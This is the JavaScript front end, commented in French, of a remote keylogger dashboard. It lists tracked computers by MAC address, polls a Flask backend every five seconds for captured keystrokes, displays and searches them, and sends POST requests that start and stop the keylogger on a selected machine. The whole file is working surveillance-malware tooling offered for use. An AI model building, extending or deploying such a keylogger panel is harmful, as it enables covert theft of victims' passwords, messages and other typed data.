let logData = []; // Stocke les frappes récupérées

document.addEventListener("DOMContentLoaded", function () {
    const computerSelect = document.getElementById("computer-list"); // Sélecteur des machines
    const logContent = document.getElementById("log-content"); // Contenu des logs affichés
    const mainMessage = document.getElementById("main-message"); // Message par défaut
    const recordingStatus = document.getElementById("recordingStatus"); // Indicateur d'enregistrement

    // 📥 1️⃣ Récupérer la liste des machines enregistrées
    async function fetchComputers() {
        const response = await fetch('/get_users'); // Requête GET pour obtenir la liste des machines
        const data = await response.json();

        // Réinitialise la liste et ajoute l'option par défaut
        computerSelect.innerHTML = '<option value="">Select a tracked computer</option>';

        for (const mac in data) {
            const option = document.createElement('option');
            option.value = mac;
            option.textContent = mac;
            computerSelect.appendChild(option);
        }
    }

    // 📥 2️⃣ Récupérer les frappes enregistrées pour la machine sélectionnée
    async function fetchData() {
        const selectedMac = computerSelect.value;
        if (!selectedMac) return;

        const response = await fetch('/get_data');  // Requête GET pour récupérer les frappes
        const data = await response.json();

        console.log("Données récupérées :", data); // Debug pour voir les logs en console
        logData = data[selectedMac] || [];
        displayContent(logData);
    }

    // 🖥️ Afficher les logs dans l'interface
    function displayContent(content) {
        logContent.innerHTML = content.map(item => `<p>${item}</p>`).join('');
    }

    // 🔎 Filtrer les frappes en fonction de la recherche utilisateur
    function searchContent(query) {
        if (!query) return displayContent(logData);
        const filtered = logData.filter(text => text.includes(query));
        displayContent(filtered);
    }

    // 📤 3️⃣ Démarrer le keylogger (via Flask)
    async function startKeylogger() {
        const selectedMac = computerSelect.value;
        if (!selectedMac) return alert("Please select a computer!");

        await fetch('/start_keylogger', { method: 'POST' }); // Requête POST vers Flask

        // Modifier l'affichage pour montrer que le keylogger est actif
        recordingStatus.style.display = "block";
        mainMessage.style.display = "none";
    }

    // 📤 4️⃣ Arrêter le keylogger (via Flask)
    async function stopKeylogger() {
        await fetch('/stop_keylogger', { method: 'POST' }); // Requête POST vers Flask

        // Modifier l'affichage pour indiquer que l'enregistrement est stoppé
        recordingStatus.style.display = "none";
        mainMessage.style.display = "block";
    }

    // Gérer le changement de sélection d'un ordinateur
    computerSelect.addEventListener("change", function () {
        if (computerSelect.value) {
            mainMessage.style.display = "none"; // Cache le message principal
            recordingStatus.style.display = "block"; // Affiche "Recording in progress..."
            fetchData(); // Récupère les données dès qu'un PC est sélectionné
        }
    });

    // 📡 Lancer la récupération des données toutes les 5 secondes
    fetchComputers(); // Récupérer la liste des machines dès le chargement
    setInterval(fetchData, 5000); // Mettre à jour les logs toutes les 5 sec
});
